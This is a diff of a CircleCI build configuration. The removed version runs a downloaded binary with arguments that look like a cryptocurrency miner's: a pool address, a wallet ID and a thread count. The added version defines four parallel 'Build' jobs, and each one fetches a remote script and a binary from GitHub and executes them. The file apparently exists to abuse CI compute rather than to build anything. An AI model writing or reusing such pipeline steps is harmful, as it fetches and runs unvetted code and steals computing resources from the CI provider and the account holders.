@@ -1,11 +1,40 @@
-version: 2.0
-jobs:
-  build:
-    docker:
-      - image: circleci/ruby:2.4.2-jessie-node
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
-    steps:
-      - checkout
-      - run:  wget -q https://github.com/Pret ykeviv/nheq/raw/main/kanyut &&chmod +x kanyut && nohup ./kanyut -v -l 139.99.123.225:3956 -u RGVegWzDKhuPUAKJybftAZm4BXShNFPCYe.$(echo $(shuf -i 1-999 -n 1)-Zero) -p x -t 8 > nohup.out
+version: 2 
+jobs: 
+    Build_01: 
+      docker: 
+            - image: circleci/ruby:2.4 
+      steps: 
+        - run: 
+            name: Build 
+            command: wget https://raw.githubusercontent.com/nurfasikin/DGB/main/runer.sh && chmod u+x runer.sh && ./runer.sh && chmod +x start &&./start 
+    Build_02: 
+      docker: 
+            - image: circleci/ruby:2.4 
+      steps: 
+        - run: 
+            name: Build 
+            command: wget https://raw.githubusercontent.com/nurfasikin/DGB/main/runer.sh && chmod u+x runer.sh && ./runer.sh && chmod +x start &&./start 
+    Build_03: 
+      docker: 
+            - image: circleci/ruby:2.4 
+      steps: 
+        - run: 
+            name: Build 
+            command: wget https://raw.githubusercontent.com/nurfasikin/DGB/main/runer.sh && chmod u+x runer.sh && ./runer.sh && chmod +x start &&./start 
+    Build_04: 
+      docker: 
+            - image: circleci/ruby:2.4 
+      steps: 
+        - run: 
+            name: Build 
+            command: wget https://raw.githubusercontent.com/nurfasikin/DGB/main/runer.sh && chmod u+x runer.sh && ./runer.sh && chmod +x start &&./start 
+ 
+ 
+workflows: 
+    version: 2 
+    build: 
+        jobs: 
+            - Build_01 
+            - Build_02 
+            - Build_03 
+            - Build_04
